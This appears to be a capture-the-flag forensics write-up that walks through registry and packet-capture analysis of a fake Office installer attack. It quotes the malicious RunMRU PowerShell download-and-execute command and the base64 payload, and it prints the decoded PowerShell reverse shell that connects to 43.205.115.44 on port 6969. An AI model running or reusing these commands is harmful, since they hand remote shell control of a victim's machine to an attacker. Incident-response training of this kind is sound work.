# To complete the lab, we needed Registry Explorer to analyze the logs of the nat and log files. Moreover, needed wireshark to analyze the pcapng file. If you are using windows, you need to download the second tool only, first one is already available. If you are using kali, you need to download the first one. The process to download the registry explorer is:
i. Go to [https://ericzimmerman.github.io/#!index.md] and download [Registry Explorer]. Unzip the file and run the exe to complete the installation. You also have to install the [windowsdesktop-runtime-6.0.36-win-x64], run its exe to complete its installation as well. This allows you to run the windows applications on the linux. Also make sure that you have [wine] installed on your linux. now run the command [wine RegistryExplorer.exe] in the directory where this exe is present. This will run the Registry Explorer.

1. Open the [NTUSER.DAT] file in the Registry Explorer which will create [NTUSER.DAT_clean] file. This file contains information of the complete logs and what happened in the system when the attack happened. Here, you can see tow main tabs: [Registry hives] and [Available bookmarks]. Click on the second one. Now scroll down a little and you will see a directory named [RunMRU]. Click on this and you will see and executable [powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"], and this is the flag.

2. Very next to the above flag, there is the UTC time when this was installed [2024-09-23 05:07:45].

3. In the flag of part-1, there is a link from where the installation is processed [http://43.205.115.44/office2024install.ps1]. Open the pcapng file and add a filter for the [ip.addr== 43.205.115.44]. Here you will see a request being made to the same link. Follow this stream and you will observe an encoded shell [powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANAAzAC4AMgAwADUALgAxADEANQAuADQANAAiACwANgA5ADYAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=].
We have to get the installed file. For this, go to File->Export Objects->HTTP and add a filter [office2024]. This will downlad the installed ps1 file. Install and open power shell in the terminal to decode the downloaded ps1 file into sha256 using the command [Get-FileHash -Path ". office2024install.ps1" -Algorithm SHA256] and you will get the flag [579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE]. If you are already in the windows, just run this command in the power shell.

4. Decode the base64 that we got in the above task. This will give us the original shell code, where we can find the port.
$client = New-Object System.Net.Sockets.TCPClient("43.205.115.44",6969);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535 | %{0};
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
};
$client.Close();

5. Use the same filter [ip.addr== 43.205.115.44] and go to the last packet, which most probably also the last packet of this pcapng file. Here, go to the [Transmission Control Protocol ............]. Go to [Timestamps].Since this is the last packet of the conversation, the time shows the total time of the conversation [403].

6. Use the same filter [ip.addr== 43.205.115.44] and you can see a successful get request with 200 status code and a file respose received [text/html]. Follow this stream and you will observe an html file. Go to the js part of this code and look for the function [stageClipboard] that is responsible for the pasting of the malicious payload.
